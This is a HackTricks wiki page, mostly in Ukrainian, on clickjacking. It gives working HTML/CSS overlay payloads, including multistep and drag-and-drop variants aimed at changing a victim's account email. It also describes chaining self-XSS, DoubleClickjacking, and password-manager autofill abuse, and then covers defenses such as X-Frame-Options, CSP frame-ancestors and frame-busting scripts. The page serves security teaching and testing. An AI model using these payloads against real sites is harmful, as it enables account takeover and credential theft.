# Clickjacking

{{#include ../banners/hacktricks-training.md}}

## Що таке Clickjacking

У атаці Clickjacking **користувача** **обманюють**, змушуючи його **натиснути** на **елемент** на веб-сторінці, який є **невидимим** або замаскований під інший елемент. Ця маніпуляція може призвести до небажаних наслідків для користувача, таких як завантаження malware, перенаправлення на зловмисні веб-сторінки, передача облікових даних або конфіденційної інформації, перекази грошей або покупка товарів онлайн.

### Трюк попереднього заповнення форм

Іноді можливо **заповнити значення полів форми за допомогою GET-параметрів під час завантаження сторінки**. Зловмисник може зловживати цією поведінкою, щоб заповнити форму довільними даними та відправити clickjacking payload, щоб користувач натиснув кнопку Submit.

### Заповнення форми через Drag\&Drop

Якщо вам потрібно, щоб користувач **заповнив форму**, але ви не хочете прямо просити його ввести певну інформацію (наприклад email або конкретний password, які ви знаєте), ви можете просто попросити його **Drag\&Drop** щось, що запише ваші контрольовані дані, як у [**this example**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Базовий Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Багатокроковий Payload
```css
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Перетягування (Drag\&Drop) + Click payload
```css
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

If you have identified an **XSS-атака, яка вимагає від користувача клікнути** на якийсь елемент, щоб **trigger** XSS, і сторінка вразлива до **Clickjacking**, ви можете зловживати цим, щоб обдурити користувача і змусити його клікнути кнопку/посилання.\
Example:\
Ви знайшли **self XSS** у деяких приватних даних облікового запису (деталі, які **лише ви можете встановлювати і читати**). Сторінка з **формою** для встановлення цих даних є **вразливою** до **Clickjacking** і ви можете **попередньо заповнити** **форму** через GET-параметри.\
Атакуючий може підготувати атаку **Clickjacking** на цю сторінку, **попередньо заповнивши** **форму** з **XSS-пейлоудом** і **обдуривши** **користувача**, щоб **відправити** форму. Тобто, **коли форму відправлено** і значення змінені, **користувач виконає XSS**.

### DoubleClickjacking

Firstly [explained in this post](https://securityaffairs.com/172572/hacking/doubleclickjacking-clickjacking-on-major-websites.html), ця техніка просить жертву зробити подвійний клік по кнопці на кастомній сторінці, розміщеній у певному місці, і використовує різницю в часі між подіями mousedown і onclick, щоб під час подвійного кліку завантажити сторінку жертви так, що **жертва фактично клікає легітимну кнопку на сторінці жертви**.

An example could be seen in this video: [https://www.youtube.com/watch?v=4rGvRRMrD18](https://www.youtube.com/watch?v=4rGvRRMrD18)

A code example can be found in [this page](https://www.paulosyibelo.com/2024/12/doubleclickjacking-what.html).

> [!WARNING]
> Ця техніка дозволяє обдурити користувача, щоб він клікнув в одному місці на сторінці жертви, обходячи будь-який захист від Clickjacking. Тому нападнику потрібно знайти **чутливі дії, які можна виконати одним кліком, наприклад підтвердження дозволів в OAuth**.

### Browser extensions: DOM-based autofill clickjacking

Окрім iframing сторінок жертви, нападники можуть націлюватися на UI-елементи browser extension, які інжектяться в сторінку. Менеджери паролів відображають випадаючі списки автозаповнення поруч із сфокусованими полями вводу; сфокусувавши поле під контролем нападника і сховавши/закривши випадачку розширення (трюки з opacity/overlay/верхнім шаром), змушений клік користувача може вибрати збережений елемент і заповнити чутливі дані у полях під контролем нападника. Ця варіація не вимагає видимості через iframe і працює повністю через маніпуляції DOM/CSS.

- For concrete techniques and PoCs see:
-
{{#ref}}
browser-extension-pentesting-methodology/browext-clickjacking.md
{{#endref}}

## Strategies to Mitigate Clickjacking

### Client-Side Defenses

Сценарії, які виконуються на клієнтській стороні, можуть виконувати дії для запобігання Clickjacking:

- Переконатися, що вікно застосунку є основним або top-вікном.
- Робити всі фрейми видимими.
- Запобігати клікам по невидимих фреймах.
- Виявляти та попереджати користувачів про потенційні спроби Clickjacking.

Однак ці скрипти для руйнування фреймів можуть бути обійдені:

- **Налаштування безпеки браузерів:** Деякі браузери можуть блокувати ці скрипти залежно від налаштувань безпеки або через відсутність підтримки JavaScript.
- **HTML5 iframe sandbox Attribute:** Нападник може нейтралізувати frame-buster скрипти, встановивши атрибут sandbox зі значеннями allow-forms або allow-scripts без allow-top-navigation. Це перешкоджає iframe перевіряти, чи є воно top window, наприклад,
```html
<iframe
id="victim_website"
src="https://victim-website.com"
sandbox="allow-forms allow-scripts"></iframe>
```
Значення allow-forms і allow-scripts дозволяють виконувати дії всередині iframe, водночас відключаючи навігацію на верхньому рівні. Щоб забезпечити заплановану функціональність цільового сайту, можуть знадобитися додаткові дозволи, такі як allow-same-origin і allow-modals, залежно від типу атаки. Повідомлення консолі браузера можуть підказати, які дозволи слід додати.

### Серверні захисти

#### X-Frame-Options

The **X-Frame-Options HTTP response header** інформує браузери щодо допустимості рендерингу сторінки в <frame> або <iframe>, допомагаючи запобігти Clickjacking:

- X-Frame-Options: deny - Жоден домен не може вставляти цей контент у фрейм.
- X-Frame-Options: sameorigin - Лише поточний сайт може вставляти цей контент у фрейм.
- X-Frame-Options: allow-from https://trusted.com - Лише вказаний 'uri' може вставляти сторінку у фрейм.
- Зауважте обмеження: якщо браузер не підтримує цю директиву, вона може не спрацювати. Деякі браузери віддають перевагу директиві CSP frame-ancestors.

#### Content Security Policy (CSP) директива frame-ancestors

**директива frame-ancestors у CSP** — рекомендований метод захисту від Clickjacking:

- frame-ancestors 'none' - Подібно до X-Frame-Options: deny.
- frame-ancestors 'self' - Подібно до X-Frame-Options: sameorigin.
- frame-ancestors trusted.com - Подібно до X-Frame-Options: allow-from.

Наприклад, наступний CSP дозволяє фреймування тільки з того самого домену:

Content-Security-Policy: frame-ancestors 'self';

Докладніші відомості та складні приклади можна знайти в [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) та в [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) з child-src та frame-src

**Content Security Policy (CSP)** — це механізм безпеки, що допомагає запобігати Clickjacking та іншим атакам ін'єкції коду, вказуючи, з яких джерел браузер має дозволяти завантаження контенту.

#### Директива frame-src

- Визначає допустимі джерела для фреймів.
- Більш специфічна, ніж директива default-src.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ця політика дозволяє фрейми з того самого походження (self) та з https://trusted-website.com.

#### child-src Directive

- Введено в CSP level 2 для вказання допустимих джерел для web workers і фреймів.
- Виступає як запасна опція для frame-src та worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ця політика дозволяє фрейми та воркери з того ж походження (self) та https://trusted-website.com.

**Примітки щодо використання:**

- Застарівання: child-src поступово виводиться з використання на користь frame-src та worker-src.
- Запасна поведінка: Якщо frame-src відсутній, child-src використовується як запасний варіант для фреймів. Якщо відсутні обидва, використовується default-src.
- Чітке визначення джерел: Включайте лише довірені джерела в директиви, щоб запобігти експлуатації.

#### JavaScript — Скрипти для розриву фрейма

Хоча це не дає повної гарантії, скрипти на JavaScript для запобігання вбудуванню у фрейм можна використовувати, щоб завадити веб-сторінці бути вставленою у фрейм. Приклад:
```javascript
if (top !== self) {
top.location = self.location
}
```
#### Використання Anti-CSRF Tokens

- **Перевірка токена:** Використовуйте anti-CSRF tokens у веб-застосунках, щоб переконатися, що запити, які змінюють стан, виконуються свідомо користувачем, а не через Clickjacked сторінку.

## Посилання

- [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
- [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)
- [DOM-based Extension Clickjacking (marektoth.com)](https://marektoth.com/blog/dom-based-extension-clickjacking/)

{{#include ../banners/hacktricks-training.md}}
